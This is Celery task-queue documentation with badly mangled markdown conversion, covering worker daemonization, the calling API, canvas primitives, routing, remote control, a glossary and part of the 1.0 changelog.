In production you'll want to run the worker in the background, described in detail in the \[daemonization tutorial \<daemonizing\>\](\#daemonization-tutorial-\<daemonizing\>).

The daemonization scripts uses the `celery multi` command to start one or more workers in the background:

`` `console     $ celery multi start w1 -A proj -l INFO     celery multi v4.0.0 (latentcall)     > Starting nodes...         > w1.halcyon.local: OK  You can restart it too:  .. code-block:: console      $ celery  multi restart w1 -A proj -l INFO     celery multi v4.0.0 (latentcall)     > Stopping nodes...         > w1.halcyon.local: TERM -> 64024     > Waiting for 1 node.....         > w1.halcyon.local: OK     > Restarting node w1.halcyon.local: OK     celery multi v4.0.0 (latentcall)     > Stopping nodes...         > w1.halcyon.local: TERM -> 64052  or stop it:  .. code-block:: console      $ celery multi stop w1 -A proj -l INFO  The ``stop`command is asynchronous so it won't wait for the`<span class="title-ref"> worker to shutdown. You'll probably want to use the </span><span class="title-ref">stopwait</span>\` command instead, which ensures that all currently executing tasks are completed before exiting:

`` `console     $ celery multi stopwait w1 -A proj -l INFO  > **Note** >      :program:`celery multi` doesn't store information about workers     so you need to use the same command-line arguments when     restarting. Only the same pidfile and logfile arguments must be     used when stopping.  By default it'll create pid and log files in the current directory. ``\` To protect against multiple workers launching on top of each other you're encouraged to put these in a dedicated directory:

`` `console     $ mkdir -p /var/run/celery     $ mkdir -p /var/log/celery     $ celery multi start w1 -A proj -l INFO --pidfile=/var/run/celery/%n.pid \                                             --logfile=/var/log/celery/%n%I.log  With the multi command you can start multiple workers, and there's a powerful ``\` command-line syntax to specify arguments for different workers too, for example:

`` `console     $ celery multi start 10 -A proj -l INFO -Q:1-3 images,video -Q:4,5 data \         -Q default -L:4,5 debug  For more examples see the :mod:`~celery.bin.multi` module in the API ``\` reference.

#### About the `--app <celery --app>` argument

The `--app <celery --app>` argument specifies the Celery app instance to use, in the form of `module.path:attribute`

But it also supports a shortcut form. If only a package name is specified, it'll try to search for the app instance, in the following order:

With `--app=proj <celery --app>`:

1)  an attribute named `proj.app`, or
2)  an attribute named `proj.celery`, or
3)  any attribute in the module `proj` where the value is a Celery application, or

If none of these are found it'll try a submodule named `proj.celery`:

4)  an attribute named `proj.celery.app`, or
5)  an attribute named `proj.celery.celery`, or
6)  Any attribute in the module `proj.celery` where the value is a Celery application.

This scheme mimics the practices used in the documentation -- that is, `proj:app` for a single contained module, and `proj.celery:app` for larger projects.

## Calling Tasks

You can call a task using the <span class="title-ref">delay</span> method:

`` `pycon     >>> from proj.tasks import add      >>> add.delay(2, 2)  This method is actually a star-argument shortcut to another method called ``\` \`apply\_async\`:

`` `pycon     >>> add.apply_async((2, 2))  The latter enables you to specify execution options like the time to run ``\` (countdown), the queue it should be sent to, and so on:

`` `pycon     >>> add.apply_async((2, 2), queue='lopri', countdown=10)  In the above example the task will be sent to a queue named ``lopri`and the`\` task will execute, at the earliest, 10 seconds after the message was sent.

Applying the task directly will execute the task in the current process, so that no message is sent:

`` `pycon     >>> add(2, 2)     4  These three methods - `delay`, `apply_async`, and applying ``<span class="title-ref"> (</span><span class="title-ref">\_\_call\_\_</span>\`), make up the Celery calling API, which is also used for signatures.

A more detailed overview of the Calling API can be found in the \[Calling User Guide \<guide-calling\>\](\#calling-user-guide-\<guide-calling\>).

Every task invocation will be given a unique identifier (an UUID) -- this is the task id.

The `delay` and `apply_async` methods return an <span class="title-ref">\~@AsyncResult</span> instance, which can be used to keep track of the tasks execution state. But for this you need to enable a \[result backend \<task-result-backends\>\](\#result-backend-\<task-result-backends\>) so that the state can be stored somewhere.

Results are disabled by default because there is no result backend that suits every application; to choose one you need to consider the drawbacks of each individual backend. For many tasks keeping the return value isn't even very useful, so it's a sensible default to have. Also note that result backends aren't used for monitoring tasks and workers: for that Celery uses dedicated event messages (see \[guide-monitoring\](\#guide-monitoring)).

If you have a result backend configured you can retrieve the return value of a task:

`` `pycon     >>> res = add.delay(2, 2)     >>> res.get(timeout=1)     4  You can find the task's id by looking at the `id` attribute:  .. code-block:: pycon      >>> res.id     d6b3aea2-fb9b-4ebc-8da4-848818db9114  You can also inspect the exception and traceback if the task raised an ``<span class="title-ref"> exception, in fact </span><span class="title-ref">result.get()</span>\` will propagate any errors by default:

`` `pycon     >>> res = add.delay(2, '2')     >>> res.get(timeout=1)  .. code-block:: pytb      Traceback (most recent call last):       File "<stdin>", line 1, in <module>       File "celery/result.py", line 221, in get         return self.backend.wait_for_pending(       File "celery/backends/asynchronous.py", line 195, in wait_for_pending         return result.maybe_throw(callback=callback, propagate=propagate)       File "celery/result.py", line 333, in maybe_throw         self.throw(value, self._to_remote_traceback(tb))       File "celery/result.py", line 326, in throw         self.on_ready.throw(*args, **kwargs)       File "vine/promises.py", line 244, in throw         reraise(type(exc), exc, tb)       File "vine/five.py", line 195, in reraise         raise value     TypeError: unsupported operand type(s) for +: 'int' and 'str'  If you don't wish for the errors to propagate, you can disable that by passing ``propagate`:  .. code-block:: pycon      >>> res.get(propagate=False)     TypeError("unsupported operand type(s) for +: 'int' and 'str'")  In this case it'll return the exception instance raised instead --`\` so to check whether the task succeeded or failed, you'll have to use the corresponding methods on the result instance:

`` `pycon     >>> res.failed()     True      >>> res.successful()     False  So how does it know if the task has failed or not?  It can find out by looking ``\` at the tasks *state*:

`` `pycon     >>> res.state     'FAILURE'  A task can only be in a single state, but it can progress through several ``\` states. The stages of a typical task can be:

    PENDING -> STARTED -> SUCCESS

The started state is a special state that's only recorded if the `task_track_started` setting is enabled, or if the `@task(track_started=True)` option is set for the task.

The pending state is actually not a recorded state, but rather the default state for any task id that's unknown: this you can see from this example:

`` `pycon     >>> from proj.celery import app      >>> res = app.AsyncResult('this-id-does-not-exist')     >>> res.state     'PENDING'  If the task is retried the stages can become even more complex. ``\` To demonstrate, for a task that's retried two times the stages would be:

`` `text     PENDING -> STARTED -> RETRY -> STARTED -> RETRY -> STARTED -> SUCCESS  To read more about task states you should see the [task-states](#task-states) section ``\` in the tasks user guide.

Calling tasks is described in detail in the \[Calling Guide \<guide-calling\>\](\#calling-guide-\<guide-calling\>).

## *Canvas*: Designing Work-flows

You just learned how to call a task using the tasks `delay` method, and this is often all you need. But sometimes you may want to pass the signature of a task invocation to another process or as an argument to another function, for which Celery uses something called *signatures*.

A signature wraps the arguments and execution options of a single task invocation in such a way that it can be passed to functions or even serialized and sent across the wire.

You can create a signature for the `add` task using the arguments `(2, 2)`, and a countdown of 10 seconds like this:

`` `pycon     >>> add.signature((2, 2), countdown=10)     tasks.add(2, 2)  There's also a shortcut using star arguments:  .. code-block:: pycon      >>> add.s(2, 2)     tasks.add(2, 2)  And there's that calling API again… ``\` -----------------------------------

Signature instances also support the calling API, meaning they have `delay` and `apply_async` methods.

But there's a difference in that the signature may already have an argument signature specified. The `add` task takes two arguments, so a signature specifying two arguments would make a complete signature:

`` `pycon     >>> s1 = add.s(2, 2)     >>> res = s1.delay()     >>> res.get()     4  But, you can also make incomplete signatures to create what we call ``\` *partials*:

`` `pycon     # incomplete partial: add(?, 2)     >>> s2 = add.s(2) ``s2`is now a partial signature that needs another argument to be complete,`\` and this can be resolved when calling the signature:

`` `pycon     # resolves the partial: add(8, 2)     >>> res = s2.delay(8)     >>> res.get()     10  Here you added the argument 8 that was prepended to the existing argument 2 ``<span class="title-ref"> forming a complete signature of </span><span class="title-ref">add(8, 2)</span>\`.

Keyword arguments can also be added later; these are then merged with any existing keyword arguments, but with new arguments taking precedence:

`` `pycon     >>> s3 = add.s(2, 2, debug=True)     >>> s3.delay(debug=False)   # debug is now False.  As stated, signatures support the calling API: meaning that  - ``sig.apply\_async(args=(), kwargs={}, \*\*options)`Calls the signature with optional partial arguments and partial     keyword arguments. Also supports partial execution options.  -`sig.delay(*args,*\*kwargs)`Star argument version of`apply\_async`. Any arguments will be prepended   to the arguments in the signature, and keyword arguments is merged with any   existing keys.  So this all seems very useful, but what can you actually do with these?`\` To get to that I must introduce the canvas primitives…

### The Primitives

<div class="topic">

**\\**

<div class="hlist" data-columns="2">

  - \[group \<canvas-group\>\](\#group-\<canvas-group\>)
  - \[chain \<canvas-chain\>\](\#chain-\<canvas-chain\>)
  - \[chord \<canvas-chord\>\](\#chord-\<canvas-chord\>)
  - \[map \<canvas-map\>\](\#map-\<canvas-map\>)
  - \[starmap \<canvas-map\>\](\#starmap-\<canvas-map\>)
  - \[chunks \<canvas-chunks\>\](\#chunks-\<canvas-chunks\>)

</div>

</div>

These primitives are signature objects themselves, so they can be combined in any number of ways to compose complex work-flows.

\> **Note** \> These examples retrieve results, so to try them out you need to configure a result backend. The example project above already does that (see the backend argument to <span class="title-ref">\~celery.Celery</span>).

Let's look at some examples:

#### Groups

A <span class="title-ref">\~celery.group</span> calls a list of tasks in parallel, and it returns a special result instance that lets you inspect the results as a group, and retrieve the return values in order.

`` `pycon     >>> from celery import group     >>> from proj.tasks import add      >>> group(add.s(i, i) for i in range(10))().get()     [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]  - Partial group  .. code-block:: pycon      >>> g = group(add.s(i) for i in range(10))     >>> g(10).get()     [10, 11, 12, 13, 14, 15, 16, 17, 18, 19]  Chains ``\` \~\~\~\~\~\~

Tasks can be linked together so that after one task returns the other is called:

`` `pycon     >>> from celery import chain     >>> from proj.tasks import add, mul      # (4 + 4) * 8     >>> chain(add.s(4, 4) | mul.s(8))().get()     64   or a partial chain:  .. code-block:: pycon      >>> # (? + 4) * 8     >>> g = chain(add.s(4) | mul.s(8))     >>> g(4).get()     64   Chains can also be written like this:  .. code-block:: pycon      >>> (add.s(4, 4) | mul.s(8))().get()     64  Chords ``\` \~\~\~\~\~\~

A chord is a group with a callback:

`` `pycon     >>> from celery import chord     >>> from proj.tasks import add, xsum      >>> chord((add.s(i, i) for i in range(10)), xsum.s())().get()     90   A group chained to another task will be automatically converted ``\` to a chord:

`` `pycon     >>> (group(add.s(i, i) for i in range(10)) | xsum.s())().get()     90   Since these primitives are all of the signature type they ``\` can be combined almost however you want, for example:

`` `pycon     >>> upload_document.s(file) | group(apply_filter.s() for filter in filters)  Be sure to read more about work-flows in the [Canvas <guide-canvas>](#canvas-<guide-canvas>) user ``\` guide.

## Routing

Celery supports all of the routing facilities provided by AMQP, but it also supports simple routing where messages are sent to named queues.

The `task_routes` setting enables you to route tasks by name and keep everything centralized in one location:

`` `python     app.conf.update(         task_routes = {             'proj.tasks.add': {'queue': 'hipri'},         },     )  You can also specify the queue at runtime ``<span class="title-ref"> with the </span><span class="title-ref">queue</span><span class="title-ref"> argument to </span><span class="title-ref">apply\_async</span>\`:

`` `pycon     >>> from proj.tasks import add     >>> add.apply_async((2, 2), queue='hipri')  You can then make a worker consume from this queue by ``<span class="title-ref"> specifying the :option:\`celery worker -Q</span> option:

`` `console     $ celery -A proj worker -Q hipri  You may specify multiple queues by using a comma-separated list. ``<span class="title-ref"> For example, you can make the worker consume from both the default queue and the </span><span class="title-ref">hipri</span><span class="title-ref"> queue, where the default queue is named </span><span class="title-ref">celery</span>\` for historical reasons:

`` `console     $ celery -A proj worker -Q hipri,celery  The order of the queues doesn't matter as the worker will ``\` give equal weight to the queues.

To learn more about routing, including taking use of the full power of AMQP routing, see the \[Routing Guide \<guide-routing\>\](\#routing-guide-\<guide-routing\>).

## Remote Control

If you're using RabbitMQ (AMQP), Redis, or Qpid as the broker then you can control and inspect the worker at runtime.

For example you can see what tasks the worker is currently working on:

`` `console     $ celery -A proj inspect active  This is implemented by using broadcast messaging, so all remote ``\` control commands are received by every worker in the cluster.

You can also specify one or more workers to act on the request using the `--destination <celery inspect --destination>` option. This is a comma-separated list of worker host names:

`` `console     $ celery -A proj inspect active --destination=celery@example.com  If a destination isn't provided then every worker will act and reply ``\` to the request.

The `celery inspect` command contains commands that don't change anything in the worker; it only returns information and statistics about what's going on inside the worker. For a list of inspect commands you can execute:

`` `console     $ celery -A proj inspect --help  Then there's the :program:`celery control` command, which contains ``\` commands that actually change things in the worker at runtime:

`` `console     $ celery -A proj control --help  For example you can force workers to enable event messages (used ``\` for monitoring tasks and workers):

`` `console     $ celery -A proj control enable_events  When events are enabled you can then start the event dumper ``\` to see what the workers are doing:

`` `console     $ celery -A proj events --dump  or you can start the curses interface:  .. code-block:: console      $ celery -A proj events  when you're finished monitoring you can disable events again:  .. code-block:: console      $ celery -A proj control disable_events  The :program:`celery status` command also uses remote control commands ``\` and shows a list of online workers in the cluster:

`` `console     $ celery -A proj status  You can read more about the :program:`celery` command and monitoring ``\` in the \[Monitoring Guide \<guide-monitoring\>\](\#monitoring-guide-\<guide-monitoring\>).

## Timezone

All times and dates, internally and in messages use the UTC timezone.

When the worker receives a message, for example with a countdown set it converts that UTC time to local time. If you wish to use a different timezone than the system timezone then you must configure that using the `timezone` setting:

`` `python     app.conf.timezone = 'Europe/London'  Optimization ``\` ============

The default configuration isn't optimized for throughput. By default, it tries to walk the middle way between many short tasks and fewer long tasks, a compromise between throughput and fair scheduling.

If you have strict fair scheduling requirements, or want to optimize for throughput then you should read the \[Optimizing Guide \<guide-optimizing\>\](\#optimizing-guide \<guide-optimizing\>).

## What to do now?

Now that you have read this document you should continue to the \[User Guide \<guide\>\](\#user-guide-\<guide\>).

There's also an \[API reference \<apiref\>\](\#api-reference-\<apiref\>) if you're so inclined.

---

resources.md

---

# Resources

<div class="contents" data-local="" data-depth="2">

</div>

## Getting Help

### Mailing list

For discussions about the usage, development, and future of Celery, please join the [celery-users](https://groups.google.com/group/celery-users/) mailing list.

### IRC

Come chat with us on IRC. The **\#celery** channel is located at the [Libera Chat](https://freenode.net) network.

## Bug tracker

If you have any suggestions, bug reports, or annoyances please report them to our issue tracker at <https://github.com/celery/celery/issues/>

## Wiki

<https://github.com/celery/celery/wiki>

## Contributing

Development of <span class="title-ref">celery</span> happens at GitHub: <https://github.com/celery/celery>

You're highly encouraged to participate in the development of <span class="title-ref">celery</span>. If you don't like GitHub (for some reason) you're welcome to send regular patches.

Be sure to also read the [Contributing to Celery](https://docs.celeryq.dev/en/main/contributing.html) section in the documentation.

## License

This software is licensed under the <span class="title-ref">New BSD License</span>. See the `LICENSE` file in the top distribution directory for the full license text.

---

glossary.md

---

# Glossary

<div class="glossary" data-sorted="">

  - acknowledged  
    Workers acknowledge messages to signify that a message has been handled. Failing to acknowledge a message will cause the message to be redelivered. Exactly when a transaction is considered a failure varies by transport. In AMQP the transaction fails when the connection/channel is closed (or lost), but in Redis/SQS the transaction times out after a configurable amount of time (the `visibility_timeout`).

  - ack  
    Short for `acknowledged`.

  - early acknowledgment  
    Task is `acknowledged` just-in-time before being executed, meaning the task won't be redelivered to another worker if the machine loses power, or the worker instance is abruptly killed, mid-execution.
    
    Configured using `task_acks_late`.

  - late acknowledgment  
    Task is `acknowledged` after execution (both if successful, or if the task is raising an error), which means the task will be redelivered to another worker in the event of the machine losing power, or the worker instance being killed mid-execution.
    
    Configured using `task_acks_late`.

  - early ack  
    Short for `early acknowledgment`

  - late ack  
    Short for `late acknowledgment`

  - ETA  
    "Estimated Time of Arrival", in Celery and Google Task Queue, etc., used as the term for a delayed message that should not be processed until the specified ETA time. See \[calling-eta\](\#calling-eta).

  - request  
    Task messages are converted to *requests* within the worker. The request information is also available as the task's `context` (the `task.request` attribute).

  - calling  
    Sends a task message so that the task function is `executed <executing>` by a worker.

  - kombu  
    Python messaging library used by Celery to send and receive messages.

  - billiard  
    Fork of the Python multiprocessing library containing improvements required by Celery.

  - executing  
    Workers *execute* task `requests <request>`.

  - apply  
    Originally a synonym to `call <calling>` but used to signify that a function is executed by the current process.

  - context  
    The context of a task contains information like the id of the task, it's arguments and what queue it was delivered to. It can be accessed as the tasks `request` attribute. See \[task-request-info\](\#task-request-info)

  - idempotent  
    Idempotence is a mathematical property that describes a function that can be called multiple times without changing the result. Practically it means that a function can be repeated many times without unintended effects, but not necessarily side-effect free in the pure sense (compare to `nullipotent`).
    
    Further reading: <https://en.wikipedia.org/wiki/Idempotent>

  - nullipotent  
    describes a function that'll have the same effect, and give the same result, even if called zero or multiple times (side-effect free). A stronger version of `idempotent`.

  - reentrant  
    describes a function that can be interrupted in the middle of execution (e.g., by hardware interrupt or signal), and then safely called again later. Reentrancy isn't the same as `idempotence <idempotent>` as the return value doesn't have to be the same given the same inputs, and a reentrant function may have side effects as long as it can be interrupted; An idempotent function is always reentrant, but the reverse may not be true.

  - cipater  
    Celery release 3.1 named after song by Autechre (<http://www.youtube.com/watch?v=OHsaqUr_33Y>)

  - prefetch multiplier  
    The `prefetch count` is configured by using the `worker_prefetch_multiplier` setting, which is multiplied by the number of pool slots (threads/processes/greenthreads).

  - <span class="title-ref">prefetch count</span>  
    Maximum number of unacknowledged messages a consumer can hold and if exceeded the transport shouldn't deliver any more messages to that consumer. See \[optimizing-prefetch-limit\](\#optimizing-prefetch-limit).

  - pidbox  
    A process mailbox, used to implement remote control commands.

</div>

---

changelog-1.0.md

---

# Change history for Celery 1.0

<div class="contents" data-local="">

</div>

## 1.0.6

  - release-date  
    2010-06-30 09:57 a.m. CEST

  - release-by  
    Ask Solem

<!-- end list -->

  - RabbitMQ 1.8.0 has extended their exchange equivalence tests to include <span class="title-ref">auto\_delete</span> and <span class="title-ref">durable</span>. This broke the AMQP backend.
    
    If you've already used the AMQP backend this means you have to delete the previous definitions:
    
      - \`\`\`console  
        $ camqadm exchange.delete celeryresults
    
    or:
    
    ``` console
    $ python manage.py camqadm exchange.delete celeryresults
    ```

<div id="version-1.0.5">

1.0.5 `` ` ===== :release-date: 2010-06-01 02:36 p.m. CEST :release-by: Ask Solem  .. _v105-critical:  Critical --------  * :sig:`INT`/:kbd:`Control-c` killed the pool, abruptly terminating the   currently executing tasks.      Fixed by making the pool worker processes ignore `SIGINT`.  * Shouldn't close the consumers before the pool is terminated, just cancel   the consumers.      See issue #122.  * Now depends on :pypi:`billiard` >= 0.3.1  * worker: Previously exceptions raised by worker components could stall   start-up, now it correctly logs the exceptions and shuts down.  * worker: Prefetch counts was set too late. QoS is now set as early as possible,   so the worker: can't slurp in all the messages at start-up.  .. _v105-changes:  Changes -------  * :mod:`celery.contrib.abortable`: Abortable tasks.      Tasks that defines steps of execution, the task can then     be aborted after each step has completed.  * `~celery.events.EventDispatcher`: No longer creates AMQP channel   if events are disabled  * Added required RPM package names under `[bdist_rpm]` section, to support building RPMs   from the sources using :file:`setup.py`.  * Running unit tests: :envvar:`NOSE_VERBOSE` environment var now enables verbose output from Nose.  * `celery.execute.apply`: Pass log file/log level arguments as task kwargs.      See issue #110.  * celery.execute.apply: Should return exception, not   `~billiard.einfo.ExceptionInfo` on error.      See issue #111.  * Added new entries to the [FAQs <faq>](#faqs-<faq>):      * Should I use retry or acks_late?     * Can I call a task by name?  .. _version-1.0.4:  1.0.4 ===== :release-date: 2010-05-31 09:54 a.m. CEST :release-by: Ask Solem  * Changelog merged with 1.0.5 as the release was never announced.  .. _version-1.0.3:  1.0.3 ===== :release-date: 2010-05-15 03:00 p.m. CEST :release-by: Ask Solem  .. _v103-important:  Important notes ---------------  * Messages are now acknowledged *just before* the task function is executed.      This is the behavior we've wanted all along, but couldn't have because of     limitations in the multiprocessing module.     The previous behavior wasn't good, and the situation worsened with the     release of 1.0.1, so this change will definitely improve     reliability, performance and operations in general.      For more information please see http://bit.ly/9hom6T  * Database result backend: result now explicitly sets `null=True` as   `django-picklefield` version 0.1.5 changed the default behavior   right under our noses :(      See: http://bit.ly/d5OwMr      This means those who created their Celery tables (via ``syncdb`or`celeryinit``) with :pypi:`django-picklefield`` versions \>= 0.1.5 has to alter their tables to allow the result field to be <span class="title-ref">NULL</span> manually.

</div>

> MySQL:
> 
>   - \`\`\`sql  
>     ALTER TABLE celery\_taskmeta MODIFY result TEXT NULL
> 
> PostgreSQL:
> 
> ``` sql
> ALTER TABLE celery_taskmeta ALTER COLUMN result DROP NOT NULL
> ```

  - Removed <span class="title-ref">Task.rate\_limit\_queue\_type</span>, as it wasn't really useful and made it harder to refactor some parts.
  - Now depends on carrot \>= 0.10.4
  - Now depends on billiard \>= 0.3.0

<div id="v103-news">

News `` ` ----  * AMQP backend: Added timeout support for `result.get()` /   `result.wait()`.  * New task option: `Task.acks_late` (default: :setting:`CELERY_ACKS_LATE`)      Late ack means the task messages will be acknowledged **after** the task     has been executed, not *right before*, which is the default behavior.      > **Note** >          This means the tasks may be executed twice if the worker         crashes in mid-execution. Not acceptable for most         applications, but desirable for others.  * Added Crontab-like scheduling to periodic tasks.      Like a cronjob, you can specify units of time of when     you'd like the task to execute. While not a full implementation     of :command:`cron`'s features, it should provide a fair degree of common scheduling     needs.      You can specify a minute (0-59), an hour (0-23), and/or a day of the     week (0-6 where 0 is Sunday, or by names: ``sun, mon, tue, wed, thu, fri, sat`).      Examples:`\`python from celery.schedules import crontab from celery.decorators import periodic\_task

</div>

> @periodic\_task(run\_every=crontab(hour=7, minute=30)) def every\_morning(): print('Runs every morning at 7:30a.m')
> 
> @periodic\_task(run\_every=crontab(hour=7, minute=30, day\_of\_week='mon')) def every\_monday\_morning(): print('Run every monday morning at 7:30a.m')
> 
> @periodic\_task(run\_every=crontab(minutes=30)) def every\_hour(): print('Runs every hour on the clock (e.g., 1:30, 2:30, 3:30 etc.).')
> 
> <div class="note">
> 
> <div class="title">
> 
> Note
> 
> </div>
> 
> </div>
> 
> This a late addition. While we have unit tests, due to the nature of this feature we haven't been able to completely test this in practice, so consider this experimental.

  - \`TaskPool.apply\_async\`: Now supports the <span class="title-ref">accept\_callback</span> argument.

  - \`apply\_async\`: Now raises <span class="title-ref">ValueError</span> if task args isn't a list, or kwargs isn't a tuple (Issue \#95).

  - <span class="title-ref">Task.max\_retries</span> can now be <span class="title-ref">None</span>, which means it will retry forever.

  - `celerybeat`: Now reuses the same connection when publishing large sets of tasks.

  - Modified the task locking example in the documentation to use <span class="title-ref">cache.add</span> for atomic locking.

  - Added experimental support for a *started* status on tasks.
    
    > If <span class="title-ref">Task.track\_started</span> is enabled the task will report its status as "started" when the task is executed by a worker.
    > 
    > The default value is <span class="title-ref">False</span> as the normal behavior is to not report that level of granularity. Tasks are either pending, finished, or waiting to be retried. Having a "started" status can be useful for when there are long running tasks and there's a need to report which task is currently running.
    > 
    > The global default can be overridden by the `CELERY_TRACK_STARTED` setting.

  - User Guide: New section <span class="title-ref">Tips and Best Practices</span>.
    
    > Contributions welcome\!

<div id="v103-remote-control">

Remote control commands `` ` -----------------------  * Remote control commands can now send replies back to the caller.      Existing commands has been improved to send replies, and the client     interface in `celery.task.control` has new keyword arguments: `reply`,     `timeout` and `limit`. Where reply means it will wait for replies,     timeout is the time in seconds to stop waiting for replies, and limit     is the maximum number of replies to get.      By default, it will wait for as many replies as possible for one second.      * rate_limit(task_name, destination=all, reply=False, timeout=1, limit=0)          Worker returns `{'ok': message}` on success,         or `{'failure': message}` on failure.              >>> from celery.task.control import rate_limit             >>> rate_limit('tasks.add', '10/s', reply=True)             [{'worker1': {'ok': 'new rate limit set successfully'}},              {'worker2': {'ok': 'new rate limit set successfully'}}]      * ping(destination=all, reply=False, timeout=1, limit=0)          Worker returns the simple message `"pong"`.              >>> from celery.task.control import ping             >>> ping(reply=True)             [{'worker1': 'pong'},              {'worker2': 'pong'},      * revoke(destination=all, reply=False, timeout=1, limit=0)          Worker simply returns `True`.              >>> from celery.task.control import revoke             >>> revoke('419e46eb-cf6a-4271-86a8-442b7124132c', reply=True)             [{'worker1': True},              {'worker2'; True}]  * You can now add your own remote control commands!      Remote control commands are functions registered in the command     registry. Registering a command is done using     `celery.worker.control.Panel.register`: ``\`python from celery.task.control import Panel

</div>

> @Panel.register def reset\_broker\_connection(state, \*\*kwargs): state.consumer.reset\_connection() return {'ok': 'connection re-established'}
> 
> With this module imported in the worker, you can launch the command using \`celery.task.control.broadcast\`:
> 
>     >>> from celery.task.control import broadcast
>     >>> broadcast('reset_broker_connection', reply=True)
> 
>   - \[{'worker1': {'ok': 'connection re-established'},  
>     {'worker2': {'ok': 'connection re-established'}}\]
> 
> **TIP** You can choose the worker(s) to receive the command by using the <span class="title-ref">destination</span> argument:
> 
>     >>> broadcast('reset_broker_connection', destination=['worker1'])
> 
> \[{'worker1': {'ok': 'connection re-established'}\]

  - New remote control command: <span class="title-ref">dump\_reserved</span>
    
    > Dumps tasks reserved by the worker, waiting to be executed:
    > 
    >     >>> from celery.task.control import broadcast
    >     >>> broadcast('dump_reserved', reply=True)
    >     [{'myworker1': [<TaskRequest ....>]}]

  - New remote control command: <span class="title-ref">dump\_schedule</span>
    
    > Dumps the workers currently registered ETA schedule. These are tasks with an <span class="title-ref">eta</span> (or <span class="title-ref">countdown</span>) argument waiting to be executed by the worker.
    > 
    > > \>\>\> from celery.task.control import broadcast \>\>\> broadcast('dump\_schedule', reply=True) \[{'w1': \[\]}, {'w3': \[\]}, {'w2': \['0. 2010-05-12 11:06:00 pri0 \<TaskRequest {name:'opalfeeds.tasks.refresh\_feed\_slice', id:'95b45760-4e73-4ce8-8eac-f100aa80273a', args:'(\<Feeds freq\_max:3600 freq\_min:60 start:2184.0 stop:3276.0\>,)', kwargs:'{'page': 2}'}\>'\]}, {'w4': \['0. 2010-05-12 11:00:00 pri0 \<TaskRequest {name:'opalfeeds.tasks.refresh\_feed\_slice', id:'c053480b-58fb-422f-ae68-8d30a464edfe', args:'(\<Feeds freq\_max:3600 freq\_min:60 start:1092.0 stop:2184.0\>,)', kwargs:'{'page': 1}'}\>', '1. 2010-05-12 11:12:00 pri0 \<TaskRequest {name:'opalfeeds.tasks.refresh\_feed\_slice', id:'ab8bc59e-6cf8-44b8-88d0-f1af57789758', args:'(\<Feeds freq\_max:3600 freq\_min:60 start:3276.0 stop:4365\>,)', kwargs:'{'page': 3}'}\>'\]}\]

<div id="v103-fixes">

Fixes `` ` -----  * Mediator thread no longer blocks for more than 1 second.      With rate limits enabled and when there was a lot of remaining time,     the mediator thread could block shutdown (and potentially block other     jobs from coming in).  * Remote rate limits wasn't properly applied (Issue #98).  * Now handles exceptions with Unicode messages correctly in   `TaskRequest.on_failure`.  * Database backend: `TaskMeta.result`: default value should be `None`   not empty string.  .. _version-1.0.2:  1.0.2 ===== :release-date: 2010-03-31 12:50 p.m. CET :release-by: Ask Solem  * Deprecated: :setting:`CELERY_BACKEND`, please use   :setting:`CELERY_RESULT_BACKEND` instead.  * We now use a custom logger in tasks. This logger supports task magic   keyword arguments in formats.      The default format for tasks (:setting:`CELERYD_TASK_LOG_FORMAT`) now     includes the id and the name of tasks so the origin of task log messages     can easily be traced.      Example output::         [2010-03-25 13:11:20,317: INFO/PoolWorker-1]             [tasks.add(a6e1c5ad-60d9-42a0-8b24-9e39363125a4)] Hello from add      To revert to the previous behavior you can set::          CELERYD_TASK_LOG_FORMAT = """             [%(asctime)s: %(levelname)s/%(processName)s] %(message)s         """.strip()  * Unit tests: Don't disable the django test database tear down,   instead fixed the underlying issue which was caused by modifications   to the `DATABASE_NAME` setting (Issue #82).  * Django Loader: New config :setting:`CELERY_DB_REUSE_MAX` (max number of   tasks to reuse the same database connection)      The default is to use a new connection for every task.     We'd very much like to reuse the connection, but a safe number of     reuses isn't known, and we don't have any way to handle the errors     that might happen, which may even be database dependent.      See: http://bit.ly/94fwdd  * worker: The worker components are now configurable: :setting:`CELERYD_POOL`,   :setting:`CELERYD_CONSUMER`, :setting:`CELERYD_MEDIATOR`, and   :setting:`CELERYD_ETA_SCHEDULER`.      The default configuration is as follows: ``\`python CELERYD\_POOL = 'celery.concurrency.processes.TaskPool' CELERYD\_MEDIATOR = 'celery.worker.controllers.Mediator' CELERYD\_ETA\_SCHEDULER = 'celery.worker.controllers.ScheduleController' CELERYD\_CONSUMER = 'celery.worker.consumer.Consumer'

</div>

> The `CELERYD_POOL` setting makes it easy to swap out the multiprocessing pool with a threaded pool, or how about a twisted/eventlet pool?
> 
> Consider the competition for the first pool plug-in started\!

  - Debian init-scripts: Use <span class="title-ref">-a</span> not <span class="title-ref">&&</span> (Issue \#82).
  - Debian init-scripts: Now always preserves <span class="title-ref">$CELERYD\_OPTS</span> from the <span class="title-ref">/etc/default/celeryd</span> and <span class="title-ref">/etc/default/celerybeat</span>.
  - celery.beat.Scheduler: Fixed a bug where the schedule wasn't properly flushed to disk if the schedule hadn't been properly initialized.
  - `celerybeat`: Now syncs the schedule to disk when receiving the `SIGTERM` and `SIGINT` signals.
  - Control commands: Make sure keywords arguments aren't in Unicode.
  - ETA scheduler: Was missing a logger object, so the scheduler crashed when trying to log that a task had been revoked.
  - `management.commands.camqadm`: Fixed typo <span class="title-ref">camqpadm</span> -\> <span class="title-ref">camqadm</span> (Issue \#83).
  - PeriodicTask.delta\_resolution: wasn't working for days and hours, now fixed by rounding to the nearest day/hour.
  - Fixed a potential infinite loop in <span class="title-ref">BaseAsyncResult.\_\_eq\_\_</span>, although there's no evidence that it has ever been triggered.
  - worker: Now handles messages with encoding problems by acking them and emitting an error message.

<div id="version-1.0.1">

1.0.1 `` ` ===== :release-date: 2010-02-24 07:05 p.m. CET :release-by: Ask Solem  * Tasks are now acknowledged early instead of late.      This is done because messages can only be acknowledged within the same     connection channel, so if the connection is lost we'd've to     re-fetch the message again to acknowledge it.      This might or might not affect you, but mostly those running tasks with a     really long execution time are affected, as all tasks that's made it     all the way into the pool needs to be executed before the worker can     safely terminate (this is at most the number of pool workers, multiplied     by the :setting:`CELERYD_PREFETCH_MULTIPLIER` setting).      We multiply the prefetch count by default to increase the performance at     times with bursts of tasks with a short execution time. If this doesn't     apply to your use case, you should be able to set the prefetch multiplier     to zero, without sacrificing performance.      > **Note** >          A patch to :mod:`multiprocessing` is currently being         worked on, this patch would enable us to use a better solution, and is         scheduled for inclusion in the `2.0.0` release.  * The worker now shutdowns cleanly when receiving the :sig:`SIGTERM` signal.  * The worker now does a cold shutdown if the :sig:`SIGINT` signal   is received 